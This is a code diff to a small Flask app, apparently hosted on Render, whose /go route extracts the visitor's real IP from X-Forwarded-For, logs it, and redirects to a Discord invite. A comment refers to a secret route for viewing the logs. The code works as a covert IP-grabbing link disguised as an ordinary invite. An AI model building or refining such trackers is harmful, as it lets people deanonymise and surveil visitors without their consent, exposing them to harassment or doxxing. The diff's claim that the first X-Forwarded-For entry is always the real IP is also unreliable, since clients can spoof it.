@@ -21,29 +21,18 @@ def home():
 
 @app.route('/go')
 def track():
-    # 1. Look at all possible IP headers used by Render
-    headers_to_check = [
-        request.headers.get('X-Forwarded-For'),
-        request.headers.get('X-Real-IP'),
-        request.environ.get('HTTP_X_FORWARDED_FOR'),
-        request.remote_addr
-    ]
+    # Render always populates this header with the user's real IP first
+    x_forwarded = request.headers.get('X-Forwarded-For')
     
-    # 2. Find the first one that isn't empty and isn't the Render IP
-    final_ip = "Unknown"
-    for header in headers_to_check:
-        if header:
-            # Grab the first IP in the list
-            first_ip = header.split(',')[0].strip()
-            if first_ip != "209.35.161.157":
-                final_ip = first_ip
-                break
-    
-    # 3. If we still only found the Render IP, just use the first header anyway
-    if final_ip == "Unknown" and headers_to_check[0]:
-        final_ip = headers_to_check[0].split(',')[0].strip()
+    if x_forwarded:
+        # Split by comma and take the FIRST IP in the list
+        # Example: "158.62.x.x, 209.35.x.x" -> "158.62.x.x"
+        ip = x_forwarded.split(',')[0].strip()
+    else:
+        # If the header is missing for some reason, use the remote address
+        ip = request.remote_addr
 
-    log_ip(final_ip)
+    log_ip(ip)
     return redirect("https://discord.gg/TMKATk684K")
 
 # Secret route to view your logs in the browser
